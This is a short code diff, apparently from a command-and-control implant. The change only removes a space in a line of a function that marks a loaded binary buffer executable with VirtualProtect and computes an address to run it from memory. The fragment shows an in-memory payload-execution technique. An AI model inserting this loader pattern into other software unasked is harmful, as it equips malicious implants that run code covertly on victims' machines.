@@ -53,7 +53,7 @@ SECTION_CODE void cmd_execute_hbin(TASK t)
     }
 
     DWORD OldProtection  = 0;
-    hannibal_instance_ptr->Win32.VirtualProtect( hbin_buff, buffer_size, PAGE_EXECUTE_READ, &OldProtection );
+    hannibal_instance_ptr->Win32.VirtualProtect(hbin_buff, buffer_size, PAGE_EXECUTE_READ, &OldProtection );
 
     UINT_PTR exec = (UINT_PTR)hbin_buff + sizeof(HBIN_IN*);
 
